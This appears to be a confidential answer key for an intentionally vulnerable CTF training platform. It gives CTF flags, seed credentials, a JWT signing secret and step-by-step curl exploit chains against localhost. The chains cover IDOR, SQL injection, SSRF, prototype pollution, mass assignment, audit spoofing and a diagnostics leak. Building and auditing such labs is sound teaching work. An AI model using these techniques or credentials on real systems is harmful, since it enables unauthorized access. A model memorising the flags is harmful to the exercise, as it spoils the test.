# INITIAL FINDINGS — PRIVATE AUDIT DOCUMENT

**Classification: CONFIDENTIAL — AUDIT TEAM ONLY**

This document contains sensitive audit findings including exact flag locations, exploit details, internal endpoints, and implementation clues. DO NOT expose through student-facing application.

---

## SENSITIVE FINDINGS SUMMARY

### JWT_SECRET (CRITICAL)
```
lamba-1787190412-7d02c8508dc8944925ba0be4c92f2d2ebc44576b41c3de06d5b217a0806b65c7
```
- Source: `GET /api/internal/diagnostics?mode=verbose` response body `config.jwt_secret`
- This is the current deployment's JWT signing secret
- Any student with this can forge arbitrary JWTs
- Impact: Complete authentication bypass

### Seed Account Credentials
```
student@gov.lamba / welcome123  (role: citizen)
admin@gov.lamba / admin2024     (role: administrator + platform_operator)
compliance@gov.lamba / compliance2024 (role: compliance_officer + employee)
```

### Keycloak Admin
```
admin / kc-1feddd989f003635142c51b096b230d45ec1558cd5e32fd1
```

### Keycloak OIDC Client Secrets
```
api-gateway-secret (clientId: api-gateway)
internal-services-secret (clientId: internal-services)
```

### Service Auth Token
- Stored in Docker secrets volume at `/secrets/.env`
- Used for inter-service communication
- Same token for all services

---

## COMPLETE FLAG INVENTORY (Post-Remediation Deployment)

| Challenge | Flag | Obtained Via |
|-----------|------|-------------|
| A01 IDOR | FLAG{8311e0841ab3039750cfdb848616333caec35a45501d716e89ed914418c5698d} | GET /api/v1/documents/3 (no auth) |
| A02 JWT Forge | FLAG in X-Admin-Audit-Trace header | Forge JWT with role:admin, use on any endpoint |
| A03 SQLi | FLAG{c8471ecbf9ddc8e8c3db6f35179625beb3d0f2fad99f9d2bbe1576d03f57c203} | GET /api/employees/search?q=Taylor (auth) |
| A04 Password Reset | Predictable token returned | POST /api/password-reset/request (no auth) |
| A05 Internal Gateway | FLAG{7f2fe2766f3714f9164eeb0389939f9980916b063447380b7b4de2dd0cf85dc5} | GET /api/internal-proxy?url=http://internal.lamba/metadata/registry (no auth) |
| A05 Metrics Line | lamba_ctf_flag{status=a51b7e1f63ffe17bf506e4c8ca935158} | GET /api/metrics/aggregate (no auth) |
| A06 Prototype Pollution | FLAG{a7104107c74db1f307b6467d025938635c9d0707911d72546fa0c43c05bd197b} | POST /api/admin/import/settings (admin auth) |
| A07 Session Fixation | FLAG{7ba654d615dec64beef4daf752409b6004053ff849435514a9d08e48f3d7d975} | POST /api/auth/cookie-login + GET /api/auth/session (no auth) |
| A08 Mass Assignment | FLAG{667cd8c5cabb2ee17fc3a927ccf83627f2fbae0f2d25583ee96a960cd3cd2a01} | PUT /api/employee/1059 (auth, escalate Analyst->Director) |
| A09 Audit Spoof | FLAG{9f59f9e304f51d396a715a87d242ed22ac3ef1f71959a37a09bd5a8472101271} | POST /api/audit/events with action:system_override + detail (no auth) |
| A10 Diagnostics | FLAG{9b60c19e8cd7f158a2bc3b3905bb1f7a959a6ea31f70bd5511ad24adeb6b11dc} | X-Diagnostics-Trace header from /api/internal/diagnostics |
| Crypto | FLAG{bd81788f7741c063aa7b5a7ff7204bd47edb2161acecb12ee9f7096cd2f3dba8} | POST /api/v1/booking/encrypted-manifest with action:decrypt |
| Forensics | FLAG{2a82dc4fe8eaaa74fc2b693f2f3e2d6900bc910789c6e0f259d5bb8b7849cae3} | Base64-decoded body from /api/_waf/logs |
| Timing | (requires brute-force) | GET /api/challenge/timing/validate?token=... |

### All Challenges Now Reachable Through Gateway
- A02 JWT Forge: Route fixed (moved before catch-all)
- A04 Password Reset: Route fixed (correct path rewrite)
- A07 Session Fixation: Routes available through /api/auth
- A05 Metrics Line: Route fixed (added before catch-all)
- Crypto Padding Oracle: GET and POST both work

---

## EXPLOIT CHAINS (Detailed)

### Chain 1: A01 IDOR — Unauthenticated Confidential Document Access

```bash
# Step 1: Discover document list (no auth needed)
curl http://localhost:8080/api/v1/documents

# Step 2: Access confidential document #3
curl http://localhost:8080/api/v1/documents/3

# Response contains:
# - Title: "Internal Cybersecurity Strategy"
# - Classification: "confidential"
# - Full content
# - FLAG in response body
```

### Chain 2: A03 SQL Injection — Employee Search Exfiltration

```bash
# Step 1: Login to get JWT
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@gov.lamba","password":"welcome123"}' | jq -r .token)

# Step 2: Search for employee with injection marker
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/employees/search?q=Taylor"

# Response includes:
# - internalNotes: "INJECTION_PROOF_ALPHA73"
# - campaign_signature: FLAG{...}
```

### Chain 3: A05/A10 Internal Gateway + SSRF

```bash
# Step 1: Direct access to internal proxy (no auth)
curl "http://localhost:8080/api/internal-proxy?url=http://internal.lamba/metadata/registry"

# Response contains fake internal registry with flag
```

### Chain 4: A05 Metrics Flag Leak

```bash
# Step 1: Access metrics aggregate
curl "http://localhost:8080/api/metrics/v1/metrics/aggregate"

# Response includes prometheus metrics from all services
# file-storage-service metrics contain:
# lamba_ctf_flag{status=47b5fe28fbcf2d4e0c325f90c3d5c2a0}
```

### Chain 5: A06 Prototype Pollution

```bash
# Step 1: Login as admin
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@gov.lamba","password":"admin2024"}' | jq -r .token)

# Step 2: Send prototype pollution payload
curl -X POST "http://localhost:8080/api/admin/import/settings" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"packageName":"test","settings":{"__proto__":{"polluted":"yes"}}}'

# Response contains:
# settings_audit_reference: FLAG{...}
```

### Chain 6: A08 Mass Assignment

```bash
# Step 1: Login as student
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@gov.lamba","password":"welcome123"}' | jq -r .token)

# Step 2: Escalate privileges via PUT
curl -X PUT "http://localhost:8080/api/employee/1003" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"Director"}'

# Response contains:
# profile_audit_hash: FLAG{...}
```

### Chain 7: A09 Audit Spoof

```bash
# Step 1: Create spoofed audit event (NO AUTH REQUIRED)
curl -X POST "http://localhost:8080/api/audit/events" \
  -H "Content-Type: application/json" \
  -d '{"action":"system_override","detail":"test","actor":"admin_root","service":"test","payload":{}}'

# Response contains:
# archive_signature: FLAG{...}
```

### Chain 8: A10 Diagnostics Leak

```bash
# Step 1: Request diagnostics (NO AUTH REQUIRED)
curl -v "http://localhost:8080/api/internal/diagnostics?mode=verbose"

# Response headers contain:
# X-Diagnostics-Trace: FLAG{...}

# Response body contains:
# config.jwt_secret: "lamba-..."
```

### Chain 9: Forensics Log Analysis

```bash
# Step 1: Get WAF logs (NO AUTH REQUIRED)
curl "http://localhost:8080/api/_waf/logs"

# Response contains base64-encoded bodies
# Decode the last log entry's body field:
echo "ZmxhZ19zdWJtaXNzaW9uOkZMQUd7ZjZiMmE2YmI1ZmY1YThhNTJlZDMxNDk2MTNlZDllOTFmYTExMzA3MzJlNjMyODg2YzZkNDZkNTI0NzE2OTlhZn0=" | base64 -d
```

---

## INTERNAL SERVICE ENDPOINTS

### Service-to-Service Communication
All services communicate via Docker network using internal hostnames:
- `auth-service:3001`
- `citizen-service:3002`
- `document-service:3003`
- `admin-service:3004`
- `audit-service:3005`
- `notification-service:3006`
- `file-storage-service:3007`
- `reporting-service:3008`
- `metrics-service:3009`
- `search-service:3010`
- `legacy-records-service:3011`
- `challenge-timing:3012`

### Direct Service Access (from host)
Only these services have exposed ports:
- challenge-timing: 3012 (intentionally exposed)
- PostgreSQL: 5433
- MinIO: 9000/9001
- Keycloak: 8180
- Kafka: 9092
- Kafka UI: 8090

---

## SEED DATA MARKERS

### SQL Injection Marker
- Employee: Michael Taylor (id: 1015)
- Field: `internalNotes = 'INJECTION_PROOF_ALPHA73'`
- Service: citizen-service, employees/search endpoint

### IDOR Target Document
- Document ID: 3
- Title: "Internal Cybersecurity Strategy"
- Classification: confidential
- Service: document-service, /v1/documents endpoint

### Prototype Pollution Detection
- Detection: `__proto__.polluted === 'yes'`
- Flag field: `settings_audit_reference`
- Service: admin-service, /v1/admin/import/settings

### Mass Assignment Detection
- Detection: role escalation to Director/Administrator
- Flag field: `profile_audit_hash`
- Service: citizen-service, PUT /employees/:id
- Gateway route: `/api/employee/{id}` (singular, NOT plural)

### Audit Spoof Detection
- Detection: `action === 'system_override'` or `actor === 'admin_root'`
- Flag field: `archive_signature`
- Service: audit-service, POST /events
- Gateway route: `/api/audit/events`

### Internal Gateway Detection
- Detection: `X-Lamba-Gateway-Proxy` header present
- Flag field: `internal_route_id`
- Service: audit-service, GET /internal/audit

### Diagnostics Detection
- Detection: `mode=verbose` query parameter
- Flag field: `X-Diagnostics-Trace` response header
- JWT_SECRET in: response body `config.jwt_secret`
- Service: audit-service, GET /internal/diagnostics

### Timing Attack
- Service: challenge-timing (port 3012)
- Endpoint: GET /validate?token=guess
- Comparison: Non-constant-time string comparison
- Flag location: environment variable CTF_FLAG_TIMING_ATTACK

---

## GATEWAY ROUTING MAP

Complete list of gateway routes and their targets:

| Gateway Path | Target Service | Path Rewrite |
|-------------|---------------|--------------|
| /health | (local) | - |
| /api/health/services | (local) | - |
| /openapi/:spec | (local) | - |
| /api/v1/auth/* | auth-service | /v1/* |
| /api/v2/auth/* | auth-service | /v2/* |
| /api/v1/oidc/* | auth-service | /v1/oidc/* |
| /api/v1/citizens/* | citizen-service | /v1/citizens/* |
| /api/v1/documents/* | document-service | /v1/documents/* |
| /api/v2/documents/* | document-service | /v2/documents/* |
| /api/v1/requests/* | document-service | /v1/requests/* |
| /api/v1/admin/* | admin-service | /v1/* |
| /api/v1/reports/* | reporting-service | /v1/reports/* |
| /api/v1/storage/* | file-storage-service | /v1/* |
| /api/v1/search/* | search-service | /v1/search/* |
| /api/v1/legacy/* | legacy-service | /legacy/v1/* |
| /api/challenge/timing/* | challenge-timing | /* |
| /api/auth/* | auth-service | /* |
| /api/citizens/* | citizen-service | /citizens/* |
| /api/employees/* | citizen-service | /employees/* |
| /api/staff/* | citizen-service | /staff/* |
| /api/documents/* | document-service | /documents/* |
| /api/requests/* | document-service | /requests/* |
| /api/admin/import/* | admin-service | /v1/admin/import/* |
| /api/admin/* | admin-service | /* |
| /api/audit/* | audit-service | /* |
| /api/notifications/* | notification-service | /* |
| /api/auth/sessions/* | auth-service | /v1/auth/sessions/* |
| /api/reports/* | reporting-service | /v1/reports/* |
| /api/storage/* | file-storage-service | /v1/* |
| /api/metrics/* | metrics-service | /* |
| /api/search/* | search-service | /v1/search/* |
| /api/legacy/* | legacy-service | /legacy/v1/* |
| /api/internal-proxy | document-service | /verify-remote |
| /api/internal/* | audit-service | /internal/* |
| /api/v1/booking/* | document-service | /v1/booking/* |
| /api/_waf/* | audit-service | /_waf/* |
| /api/v1/staff-directory | citizen-service | /staff/directory |
| /api/approve-grant | admin-service | /grants/approve |
| /api/employee/* | citizen-service | /employees/* |
| /api/password-reset | auth-service | (root) |

### Public Paths (No Auth Required)
- /health
- /api/health/services
- /api/auth/login
- /api/auth/register
- /api/v1/auth/login
- /api/v1/auth/register
- /api/v1/oidc
- /api/auth/v1/oidc
- /openapi

---

## IDENTIFIED ROUTING BUGS

1. **Password Reset**: `/api/password-reset` -> auth-service `/` (should be `/password-reset`)
2. **Session Fixation**: No gateway route for `/cookie-login` or `/session`
3. **JWT Forge Sessions**: `/api/auth/sessions` -> auth-service `/sessions` (should be `/v1/auth/sessions`)
4. **Metrics Aggregate**: `/api/metrics/aggregate` -> metrics-service `/aggregate` (should be `/v1/metrics/aggregate`)
5. **Legacy Double-v1**: `/api/v1/legacy/session/validate` -> `/legacy/v1/v1/session/validate`
6. **Crypto POST**: POST to `/api/v1/booking/encrypted-manifest` not proxied

---

## DATABASE SCHEMA (Key Tables)

### Users
- id, email (unique), password (bcrypt), role, roleId, citizenId (unique), employeeId (unique), lastLoginAt, lastLoginIp

### Employees
- id, name, email (unique), phone, passport, nin, role, internalNotes, ministryId

### Documents
- id, title, type, classification, content, status, storageKey, bucket, ministryId

### AuditLog
- id, action, detail, actor, service, correlationId, createdAt

---

*End of Private Findings Document*
